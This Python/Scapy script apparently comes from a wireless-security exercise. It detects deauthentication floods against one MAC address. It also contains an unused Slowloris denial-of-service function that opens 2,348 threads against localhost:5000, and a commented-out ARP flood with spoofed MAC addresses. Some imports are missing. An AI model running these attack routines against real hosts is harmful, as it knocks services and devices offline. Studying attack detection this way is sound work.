from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth
from scapy.layers.l2 import Ether, ARP
from threading import Thread
import warnings

user_to_save = 'a8:9c:ed:69:f0:1b'
right_network = 'ff:ff:ff:ff:ff:ff'
warnings.filterwarnings('ignore')
stop_threads = False
# var = {'num of Deauth': 0, 'time now': 0, 'reset': False}


class Var:
    num_of_deauth = 0
    time_now = 0
    reset = False

time_check = 2


def sleep_time(t):
    while True:
        time.sleep(1)
        Var.time_now += 1


def callback(packet):
    # set timer
    if Var.time_now % time_check == 0 and not Var.reset:
        # it is attack
        if Var.num_of_deauth > 10:
            print('There is attack!')
        print(Var.num_of_deauth)
        Var.num_of_deauth = 0
        Var.reset = True
    if Var.time_now % time_check != 0:
        Var.reset = False

    # check if the packet is Dot11Deauth
    frame = packet[Dot11]
    if packet.haslayer(Dot11Deauth):
        if str(frame.addr2) == user_to_save or str(frame.addr1) == user_to_save:
            Var.num_of_deauth += 1


def slow_loris():
    def attack():
        s = socket.socket()
        s.settimeout(50)
        s.connect(("localhost", 5000))
        s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
        while True:
            try:
                s.send("X-a:2\r\n".encode("utf-8"))
                time.sleep(3)
            except:
                pass

    number_of_threads = 2348
    try:
        for i in range(number_of_threads):
            t = threading.Thread(target=attack)
            t.start()
    except:
        pass


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)
        if stop_threads:
            break


if __name__ == "__main__":
    # 1. Get network interface card names & print
    interface = 'wlx5ca6e6a31cec'
    # 3. Enable monitor mode
    os.system(f'sudo ifconfig {interface} down')  # sudo ifconfig wlx5ca6e6a31cec down
    os.system(f'sudo iwconfig {interface} mode monitor')  # sudo iwconfig wlx5ca6e6a31cec mode monitor
    os.system(f'sudo ifconfig {interface} up')  # sudo ifconfig wlx5ca6e6a31cec up

    # 4. Start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    # global st
    st = threading.Thread(target=sleep_time)
    st.start()
    # 5. Start sniffing (Synchronous process)
    sniff(prn=callback, iface=interface, timeout=100)

    # 6. Stop printing and changing channel threads
    stop_threads = True

# vendor = "b8:e8:56:"
# destMAC = "8e:64:83:6c:b3:06"  # orna_plus: ec:41:18:b8:e6:4c , MiPhone: 8e:64:83:6c:b3:06
#
# while 1:
#     randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
#     # print(randMAC)
#     sendp(Ether(src=randMAC, dst=destMAC) /
#           ARP(op=2, psrc="0.0.0.0", hwdst=destMAC) / Padding(load="X" * 18), verbose=0)
